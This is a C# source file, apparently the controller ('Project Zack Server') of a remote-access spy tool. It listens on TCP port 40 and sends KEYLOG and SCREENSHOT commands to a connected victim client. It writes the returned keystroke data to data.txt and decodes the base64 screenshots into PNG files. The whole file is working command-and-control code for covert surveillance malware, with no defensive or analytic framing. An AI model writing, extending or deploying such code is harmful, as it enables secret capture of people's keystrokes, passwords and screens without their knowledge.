using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Server
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Project Zack Server";
            StartServer();
        }
        public static string Command = string.Empty;
        static NetworkStream stream;
        static void StartServer()
        {
            TcpListener server = null;
            try
            {
                int packetSize = 256;
                Int32 port = 40;
                server = new TcpListener(IPAddress.Any, port);

                server.Start();

                Byte[] bytes = new Byte[packetSize];
                String data = null;

                Console.Write("Waiting for a connection... ");
                TcpClient client = server.AcceptTcpClient();
                Console.WriteLine("Connected!");
                stream = client.GetStream();

                Thread input = new Thread(Input);
                input.Start();


                int i;
                while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                {
                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                    Console.WriteLine("Received: {0}", data);

                    if (data.ToUpper().StartsWith("DATA"))
                    {
                        StreamWriter file = new StreamWriter(Directory.GetCurrentDirectory() + "/data.txt", true);
                        file.Write(data.Remove(0, "DATA".Length));
                        file.Close();
                        Console.WriteLine("Sent: {0}", "TextFile");
                    }
                    else if (data.ToUpper().StartsWith("IMAGE"))
                    {
                        Console.WriteLine("Received: {0}", "screenshot");
                        string strm = data.Remove(0, "IMAGE".Length);
                        var myfilename = string.Format(@"{0}", Guid.NewGuid());
                        string filepath = (Directory.GetCurrentDirectory() + myfilename + ".png");
                        var bytess = Convert.FromBase64String(strm);
                        using (var imageFile = new FileStream(filepath, FileMode.Create))
                        {
                            imageFile.Write(bytess, 0, bytess.Length);
                            imageFile.Flush();
                        }
                        Console.WriteLine("Received: {0}", "screenshot");
                    }
                    else if (data.ToUpper().StartsWith("DISCONNECT"))
                    {
                        Console.WriteLine("Received: {0}", data);
                        server.Stop();
                    }
                    Console.WriteLine("==");
                }
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
            finally
            {
                server.Stop();
            }
        }
        static void Input()
        {
            while (true)
            {
                Command = Console.ReadLine().ToUpper();
                if (Command == "HELP")
                {
                    Console.WriteLine("==HELP==");
                    Console.WriteLine("KEYLOG");
                    Console.WriteLine("DISCONNECT");
                    Console.WriteLine("SCREENSHOT");
                }
                else if (Command == "KEYLOG")
                {
                    byte[] msg = Encoding.ASCII.GetBytes("SENDKCAPTURE");
                    stream.Write(msg, 0, msg.Length);
                    Console.WriteLine("Sent: {0}", "SENDKCAPTURE");
                }
                else if (Command == "SCREENSHOT")
                {
                    byte[] msg = Encoding.ASCII.GetBytes("SCREENSHOT");
                    stream.Write(msg, 0, msg.Length);
                    Console.WriteLine("Sent: {0}", "SCREENSHOT");
                }
                else if (Command == "DISCONNECT")
                {
                    byte[] msg = Encoding.ASCII.GetBytes("DISCONNECT");
                    stream.Write(msg, 0, msg.Length);
                    Console.WriteLine("Sent: {0}", "DISCONNECT");
                }
                else
                {
                    Console.WriteLine("UNKNOWN COMMAND. TYPE HELP FOR LIST OF COMMANDS.");
                }
            }
        }


    }
}